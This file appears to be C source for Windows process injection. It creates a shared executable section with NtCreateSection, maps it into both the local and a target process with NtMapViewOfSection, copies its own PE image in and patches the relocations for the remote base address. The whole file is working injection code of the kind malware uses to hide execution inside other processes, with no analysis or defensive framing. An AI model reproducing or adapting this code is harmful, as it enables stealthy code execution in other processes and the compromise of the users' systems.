#include <Windows.h>
#include <stdio.h>
#include "NtDefs.h"

// Nt function are resolved in Main.c
extern t_NtUnmapViewOfSection NtUnmapViewOfSection;
extern t_NtCreateSection NtCreateSection;
extern t_NtMapViewOfSection NtMapViewOfSection;
extern t_NtSetContextThread NtSetContextThread;
extern t_NtClose NtClose;

// fix our PE's reloc table so it can run at the new base address once injected into target process
BOOL RelocatePE(PBYTE code_buffer, LPVOID new_base_address)
{
	ULONG_PTR delta, reloc_table_offset, total_size, reloc_table_size, entry_offset;
	int num_entries;
	PWORD entries_start;
	PIMAGE_NT_HEADERS nt_headers;
	PIMAGE_BASE_RELOCATION reloc;

	delta = (ULONG_PTR)new_base_address - (ULONG_PTR)GetModuleHandleA(NULL);

	nt_headers = (PIMAGE_NT_HEADERS)((ULONG_PTR)code_buffer + ((PIMAGE_DOS_HEADER)code_buffer)->e_lfanew);

	if (nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress <= 0)
		return FALSE;

	reloc_table_offset = nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
	reloc_table_size = nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;

	reloc = (PIMAGE_BASE_RELOCATION)&code_buffer[reloc_table_offset];

	for (total_size = 0; total_size < reloc_table_size; total_size += reloc->SizeOfBlock, *(ULONG_PTR*)&reloc += reloc->SizeOfBlock)
	{
		num_entries = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
		entries_start = (PWORD)((ULONG_PTR)(reloc)+sizeof(IMAGE_BASE_RELOCATION));

		for (int i = 0; i < num_entries; i++)
		{
			if ((entries_start[i] >> 12) & IMAGE_REL_BASED_HIGHLOW)
			{
				entry_offset = reloc->VirtualAddress + (entries_start[i] & 0xFFF);
				*(PDWORD)&code_buffer[entry_offset] += (delta);
			}
		}
	}

	return TRUE;
}

// inject our PE into the target process using NtMapViewOfSection
LPVOID InjectProcess(HANDLE target_process)
{
	ULONG_PTR original_base_addr, our_base_addr;
	PIMAGE_NT_HEADERS nt_headers;
	PIMAGE_SECTION_HEADER section_header;
	NTSTATUS status;
	HANDLE section_handle = NULL;
	LARGE_INTEGER section_max_size = { 0,0 };
	PVOID local_base_addr = NULL, remote_base_addr = NULL;
	ULONG_PTR view_size = 0;
	BOOL success = FALSE;

	do { // this isn't a loop

		our_base_addr = (ULONG_PTR)GetModuleHandleA(NULL);

		nt_headers = (PIMAGE_NT_HEADERS)((ULONG_PTR)our_base_addr + ((PIMAGE_DOS_HEADER)our_base_addr)->e_lfanew);
		if (nt_headers->Signature != IMAGE_NT_SIGNATURE) {
			printf("File is not valid PE\n");
			break;
		}

		section_max_size.LowPart = nt_headers->OptionalHeader.SizeOfImage;

		status = NtCreateSection(&section_handle, SECTION_MAP_EXECUTE | SECTION_MAP_READ | SECTION_MAP_WRITE, NULL,
								 &section_max_size, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
		if (!NT_SUCCESS(status)) {
			printf("NtCreateSection() failed, error: %X\n", status);
			break;
		}

		// map a copy of the section into the current process so we can read/write it
		status = NtMapViewOfSection(section_handle, GetCurrentProcess(), &local_base_addr, NULL, NULL, NULL,
									&view_size, 2, NULL, PAGE_EXECUTE_READWRITE);
		if (!NT_SUCCESS(status)) {
			printf("NtMapViewOfSection() failed, error: %X\n", status);
			break;
		}

		// map of copy of the section into the remote process
		status = NtMapViewOfSection(section_handle, target_process, &remote_base_addr, NULL, NULL, NULL,
									&view_size, 2, NULL, PAGE_EXECUTE_READWRITE);
		if (!NT_SUCCESS(status)) {
			printf("NtMapViewOfSection() failed, error: %X\n", status);
			break;
		}

		// section are shared memory so everything we do to local section is reflected in remote one
		memcpy(local_base_addr, (LPVOID)our_base_addr, nt_headers->OptionalHeader.SizeOfImage);
		RelocatePE((PBYTE)local_base_addr, remote_base_addr);

		success = TRUE;

	} while (FALSE);

	if (success == FALSE && remote_base_addr != NULL) {
		NtUnmapViewOfSection(target_process, remote_base_addr);
		remote_base_addr = NULL;
	}

	if (local_base_addr != NULL)
		NtUnmapViewOfSection(GetCurrentProcess(), local_base_addr);

	if (section_handle != NULL)
		NtClose(section_handle);

	return remote_base_addr;
}